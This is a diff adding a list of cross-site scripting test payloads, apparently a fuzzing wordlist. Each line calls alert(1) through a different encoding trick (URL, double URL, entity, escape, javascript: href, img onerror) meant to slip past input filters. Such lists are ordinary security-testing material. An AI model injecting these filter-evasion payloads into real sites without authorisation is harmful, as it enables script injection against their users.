@@ -1,0 +1,11 @@
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+\u003cscript\u003ealert(1)\u003c/script\u003e
+\x3cscript\x3ealert(1)\x3c/script\x3e
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+&lpar;alert&rpar;(1)
+<a href="&#106;avascript:alert(1)">Click</a>
+<a href="javascript&colon;alert(1)">Click</a>
+<img src=x onerror=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000049&#0000041>
